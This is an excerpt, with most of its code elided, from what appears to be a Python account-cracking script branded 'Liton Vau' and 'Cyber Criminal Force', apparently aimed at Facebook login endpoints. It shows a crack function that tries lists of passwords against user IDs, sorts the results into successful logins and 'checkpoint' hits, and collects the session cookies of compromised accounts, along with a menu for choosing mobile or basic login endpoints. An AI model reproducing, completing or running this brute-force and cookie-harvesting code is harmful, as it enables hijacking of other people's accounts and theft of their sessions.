...
╚█████╔╝██╗╚█████╔╝██╗██║░░░░░
░╚════╝░╚═╝░╚════╝░╚═╝╚═╝░░░░░
           \033[1;94m𝑩𝒚𝑷𝒂𝑺s: 𝐈𝐭’𝐬 𝐋𝐢𝐭𝐨𝐧 𝐕𝐚𝐮
Join Our Team:👉 Cyber Criminal Force 
'''
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('DH.OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
...
def setting():
	...
	print('') 
	cetak(nel('[bold purple]❤️➣1. MOBILE[pro]\n❤️➣2. MBASIC[pro]\n❤️➣3. TOUCH\n❤️➣4. MTOUCH [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}LITON-VAU-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     🥴 LITON-CHECKPOINT 😬 [red]'))
				...
				cetak(nel('[green]      ❤️😍 Liton-OK ❤️😍[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      😭HELLO THIS Liton-Vau 🤣[purple]')) 
...
▀▄▄▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▄▄▀
           ...
           \033[1;94mBypass: 𝐈𝐭’𝐬 𝐋𝐢𝐭𝐨𝐧 𝐕𝐚𝐮
